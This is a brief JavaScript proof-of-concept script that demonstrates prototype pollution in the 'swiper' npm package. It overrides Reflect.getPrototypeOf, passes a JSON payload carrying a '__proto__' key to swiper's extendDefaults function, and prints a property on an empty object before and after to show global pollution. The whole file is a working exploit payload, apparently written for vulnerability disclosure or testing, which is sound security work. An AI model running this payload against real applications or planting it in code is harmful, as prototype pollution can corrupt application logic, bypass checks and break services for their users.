Reflect.getPrototypeOf = () => false;
var swiper = require('swiper');
let obj = {};
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
swiper.default.extendDefaults(JSON.parse(malicious_payload));
console.log({}.polluted);